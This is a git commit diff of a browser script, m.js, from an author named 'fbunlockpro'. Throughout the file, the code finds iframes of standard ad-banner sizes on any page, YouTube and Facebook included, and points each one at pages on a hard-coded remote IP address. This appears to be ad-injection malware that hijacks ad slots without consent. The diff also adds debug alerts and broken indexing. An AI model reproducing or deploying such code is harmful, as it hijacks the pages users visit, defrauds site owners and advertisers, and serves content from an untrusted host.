59e0e987764d32bfdfebdfcb770959d220a75a89
fbunlockpro <fbunlockpro@yopmail.com>
2014-10-20 17:27:03 +0100

    Update m.js

--- m.js
+++ m.js
@@ -9,123 +9,123 @@ alert('hi');
 
 				iframe_tags = document.getElementsByTagName('iframe');
 								
-					if (iframe_tags[x].width == 120 && iframe_tags[x].height == 600) 
+					if (iframe_tags.width == 120 && iframe_tags.height == 600) 
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/120x600.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/120x600.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/120x600.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/120x600.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/120x600.html';									
+										iframe_tags.src = 'http://50.31.160.220/dead/120x600.html';									
 									}
 									commonadunit = true;
 								}
 							
-					if (iframe_tags[x].width == 160 && iframe_tags[x].height == 600) 
+					if (iframe_tags.width == 160 && iframe_tags.height == 600) 
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/160x600.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/160x600.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/160x600.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/160x600.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/160x600.html';									
+										iframe_tags.src = 'http://50.31.160.220/dead/160x600.html';									
 									}
 									commonadunit = true;
 								}
 							
-					if (iframe_tags[x].width == 234 && iframe_tags[x].height == 60) 
+					if (iframe_tags.width == 234 && iframe_tags.height == 60) 
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/234x60.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/234x60.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/234x60.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/234x60.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/234x60.html';									
+										iframe_tags.src = 'http://50.31.160.220/dead/234x60.html';									
 									}
 									commonadunit = true;
 								}
 							
-					if (iframe_tags[x].width == 300 && iframe_tags[x].height == 250) 
+					if (iframe_tags.width == 300 && iframe_tags.height == 250) 
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/300x250_v1.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/300x250_v1.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/300x250_v1.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/300x250_v1.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/300x250_v1.html';									
+										iframe_tags.src = 'http://50.31.160.220/dead/300x250_v1.html';									
 									}
 									commonadunit = true;
 								}
 							
-				        if (iframe_tags[x].width == 336 && iframe_tags[x].height == 280) 
+				        if (iframe_tags.width == 336 && iframe_tags.height == 280) 
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/336x280.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/336x280.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/336x280.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/336x280.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/336x280.html';									
+										iframe_tags.src = 'http://50.31.160.220/dead/336x280.html';									
 									}
 									commonadunit = true;
 								}
 						
-					if (iframe_tags[x].width == 468 && iframe_tags[x].height == 60) 
+					if (iframe_tags.width == 468 && iframe_tags.height == 60) 
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/468x60.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/468x60.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/468x60.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/468x60.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/468x60.html';									
+										iframe_tags.src = 'http://50.31.160.220/dead/468x60.html';									
 									}
 									commonadunit = true;
 								}
 							
-					if (iframe_tags[x].width == 728 && iframe_tags[x].height == 90) 
+					if (iframe_tags.width == 728 && iframe_tags.height == 90) 
 								{
 									alert('hi');
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/728x90.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/728x90.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://50.31.160.220/dead/728x90.html';
+										iframe_tags.src = 'http://50.31.160.220/dead/728x90.html';
 									}
 									else 
 									{
 
-										iframe_tags[x].src = 'http://50.31.160.220/dead/728x90.html';									
+										iframe_tags.src = 'http://50.31.160.220/dead/728x90.html';									
 									}
 									commonadunit = true;
 								}
